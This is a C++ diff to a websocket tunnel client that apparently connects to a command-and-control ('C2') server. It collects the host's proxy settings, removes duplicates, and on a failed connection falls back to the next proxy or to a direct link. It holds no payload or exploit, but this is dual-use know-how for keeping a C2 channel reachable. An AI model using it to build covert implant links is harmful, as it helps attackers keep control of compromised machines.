@@ -49,6 +49,7 @@ public:
     impl(std::string& c2_uri)
         : uri_(c2_uri)
         , proxy_list_(get_proxies(c2_uri))
+        , proxy_iter_(proxy_list_.cbegin())
         , io_context_(net::io_context {})
         , ssl_context_(net::ssl::context::tlsv12_client)
         , aio_work_(net::executor_work_guard<net::io_context::executor_type>(io_context_.get_executor()))
@@ -69,23 +70,7 @@ public:
                   // Create a shared pointer that holds the socket by moving it into the shared storage
                   auto storage = std::make_shared<wsinternal::shared_storage>(std::move(socket));
 
-                  // ToDo: Right now we are just using the first proxy on proxy_list but we should be trying all of the ones present
-                  // in proxy_list because some of them may not reach the C2
-                  wsinternal::tcpconn::create(executor, uri_, (*proxy_list_.begin()), [&, storage](net::ip::tcp::socket&& wssocket) {
-                      auto executor = wssocket.get_executor();
-
-                      // Create a new shared wsconn which will go do the whole song and dance to get connected to a websocket
-                      wsinternal::wsconn::create(
-                          executor,
-                          std::move(wssocket),
-                          ssl_context_,
-                          // Lambda copies storage (thereby increasing the shared_ptr) and captures it
-                          [storage](wsstream&& wsocket) {
-                              // Using our storage shared pointer we get the socket, and move it into the bridge
-                              // alongside moving the websocket into the bridge
-                              wsinternal::bridge::create(std::move(storage->get_socket()), std::move(wsocket));
-                          });
-                  });
+                  create_connection(storage, executor);
               })
     {
 
@@ -106,9 +91,39 @@ public:
         io_runner_.join();
     }
 
-    std::set<std::string> get_proxies(std::string c2_uri)
+    void create_connection(std::shared_ptr<wsinternal::shared_storage> storage, boost::asio::executor& executor)
     {
-        std::set<std::string> proxy_list { "direct://" };
+        wsinternal::tcpconn::create(
+            executor, uri_, *proxy_iter_, [&, storage](net::ip::tcp::socket&& wssocket) {
+                      auto executor = wssocket.get_executor();
+
+                      // Create a new shared wsconn which will go do the whole song and dance to get connected to a websocket
+                      wsinternal::wsconn::create(
+                          executor,
+                          std::move(wssocket),
+                          ssl_context_,
+                          // Lambda copies storage (thereby increasing the shared_ptr) and captures it
+                          [storage](wsstream&& wsocket) {
+                              // Using our storage shared pointer we get the socket, and move it into the bridge
+                              // alongside moving the websocket into the bridge
+                              wsinternal::bridge::create(std::move(storage->get_socket()), std::move(wsocket));
+                          }); },
+            [&, storage](const std::error_code& error) {
+                std::cerr << "Received an error: " << error.message() << std::endl;
+
+                if (++proxy_iter_ == proxy_list_.cend()) {
+                    std::cerr << "Exhausted list of proxies" << std::endl;
+                    return;
+                }
+
+                create_connection(storage, executor);
+            });
+    }
+
+    std::vector<std::string> get_proxies(std::string c2_uri)
+    {
+        std::set<std::string> proxy_uniq;
+        std::vector<std::string> proxy_list;
 
         /* Create the proxy factory object */
         std::unique_ptr<pxProxyFactory, std::function<void(pxProxyFactory*)>> pf {
@@ -128,7 +143,17 @@ public:
 
         /* Loop over the list until we get to a nullptr */
         for (char** proxyitem = proxies.get(); *proxyitem != nullptr; ++proxyitem) {
-            proxy_list.insert(*proxyitem);
+            // Make sure that the proxy is unique, sets are unfortunately not
+            // insertion order, so we need a vector to keep track of things
+            if (proxy_uniq.find(*proxyitem) == proxy_uniq.end()) {
+                proxy_uniq.insert(*proxyitem);
+                proxy_list.push_back(*proxyitem);
+            }
+        }
+
+        // Make sure that direct:// is in the list
+        if (proxy_uniq.find("direct://") == proxy_uniq.end()) {
+            proxy_list.push_back("direct://");
         }
 
         return proxy_list;
@@ -136,7 +161,8 @@ public:
 
 private:
     std::string uri_;
-    std::set<std::string> proxy_list_;
+    std::vector<std::string> proxy_list_;
+    decltype(proxy_list_)::const_iterator proxy_iter_;
     net::io_context io_context_;
     net::ssl::context ssl_context_;
     net::executor_work_guard<net::io_context::executor_type> aio_work_;
